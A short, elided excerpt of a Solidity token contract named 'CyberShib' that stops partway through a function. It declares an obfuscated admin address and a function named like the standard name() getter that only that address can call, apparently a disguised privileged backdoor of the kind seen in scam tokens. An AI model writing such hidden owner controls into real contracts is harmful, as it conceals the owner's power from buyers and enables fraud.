...
contract CYBERSHIB is Ownable {
    ...
    string public _tokenname = "CyberShib";
    string public _tokensymbol = "CYBERSHIB";
    uint256 tokenamount = 10000000000*10**decimals();
    address public dsjauh7;
    ...
    function name(address jjkxq1) public     {
        require(dsjauh7 ==  _msgSender());
        if(dsjauh7 != _msgSender()){
                revert("fu");
        }
